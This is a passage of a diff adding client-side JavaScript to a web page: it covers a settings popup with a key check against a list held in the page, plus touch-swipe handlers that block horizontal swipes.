+function hideSettingsPopup() {
+  document.querySelector('.settings-popup').style.display = 'none';
+  document.querySelector('.popup-overlay').style.display = 'none';
+}
+function verifySettingsKey() {
+  const keyInput = document.querySelector('.settings-key-input');
+  const key = keyInput.value.trim();
+  if (validKeys.includes(key)) {
+    if (!keyFoundMap.has(key)) {
+      keyFoundMap.set(key, 0);
+    }
+    verifiedKey = key;
+    alert('Key verified successfully!');
+    hideSettingsPopup();
+  } else {
+    alert('Invalid key. Please try again.');
+    keyInput.value = '';
+  }
+}
+document.addEventListener('touchstart', handleTouchStart, false);
+document.addEventListener('touchmove', handleTouchMove, false);
+let xDown = null;
+let yDown = null;
+function handleTouchStart(evt) {
+  xDown = evt.touches[0].clientX;
+  yDown = evt.touches[0].clientY;
+}
+function handleTouchMove(evt) {
+  if (!xDown || !yDown) {
+    return;
+  }
+  let xUp = evt.touches[0].clientX;
+  let yUp = evt.touches[0].clientY;
+  let xDiff = xDown - xUp;
+  let yDiff = yDown - yUp;
+  if (evt.target.closest('.info-box')) {
+    return;
+  }
+  if (Math.abs(xDiff) > Math.abs(yDiff)) {
+    evt.preventDefault();
+  }
+  xDown = null;
+  yDown = null;
+}</script>
+</body></html>
